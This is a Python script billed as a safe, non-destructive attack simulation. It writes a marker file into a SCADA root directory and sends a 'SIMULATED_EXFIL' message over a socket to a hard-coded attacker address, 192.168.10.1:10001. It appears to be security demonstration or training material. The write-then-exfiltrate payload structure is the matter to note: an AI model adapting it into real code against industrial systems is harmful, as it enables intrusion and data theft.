"""
demo_payload.py — Safe attack simulation payload

Behavior:
1) Simulates unauthorized modification in SCADA root by appending to a marker file.
2) Simulates copying data back to attacker over LAN socket.

This is demo-only and intentionally non-destructive.
"""

import os
import socket
import time


ATTACKER_IP = "192.168.10.1"
ATTACKER_PORT = 10001


def resolve_scada_root() -> str:
    base_dir = os.path.dirname(os.path.abspath(__file__))
    candidate = os.path.join(base_dir, "scada_root")
    if os.path.isdir(candidate):
        return candidate
    return r"C:\SCADA_ROOT"


def simulate_scada_modification(scada_root: str) -> str:
    os.makedirs(scada_root, exist_ok=True)
    marker_path = os.path.join(scada_root, "attack_simulation_marker.txt")
    line = f"SIMULATED unauthorized write at {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
    with open(marker_path, "a", encoding="utf-8") as fh:
        fh.write(line)
    print(f"[payload] Simulated SCADA write: {marker_path}")
    return marker_path


def simulate_exfiltration(file_path: str) -> None:
    msg = f"SIMULATED_EXFIL|{os.path.basename(file_path)}|{time.time()}"
    try:
        with socket.create_connection((ATTACKER_IP, ATTACKER_PORT), timeout=2) as sock:
            sock.sendall(msg.encode("utf-8", errors="ignore"))
        print(f"[payload] Simulated exfil sent to {ATTACKER_IP}:{ATTACKER_PORT}")
    except OSError:
        print("[payload] Exfil simulation skipped (attacker listener not running)")


def main() -> None:
    scada_root = resolve_scada_root()
    touched = simulate_scada_modification(scada_root)
    simulate_exfiltration(touched)


if __name__ == "__main__":
    main()
